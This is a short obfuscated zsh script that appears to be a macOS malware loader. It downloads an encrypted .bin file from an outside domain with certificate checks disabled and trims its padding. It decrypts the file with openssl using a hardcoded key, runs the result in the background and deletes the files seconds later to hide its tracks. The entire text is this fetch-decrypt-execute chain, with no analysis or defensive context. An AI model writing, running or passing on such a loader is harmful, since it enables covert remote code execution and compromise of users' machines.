#!/bin/zsh
dqwvg=$(mktemp /tmp/ck5476.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m9e0c670a13c1c7ee.bin" -o "$dqwvgz" || exit 1
y4xm2c=$(stat -f %z "$dqwvgz"); nsgj6te=$(( y4xm2c - 539 - 1806 ))
tail -c +$(( 539 + 1 )) "$dqwvgz" | head -c $nsgj6te | openssl enc -d -aes-256-cbc -k 4afd0c77f191e50085860fd6 -out "$dqwvg" 2>/dev/null
[ -s "$dqwvg" ] && chmod 700 "$dqwvg" && ( "$dqwvg" & ) && disown
( sleep 3; rm -f "$dqwvg" "$dqwvgz" ) &>/dev/null &
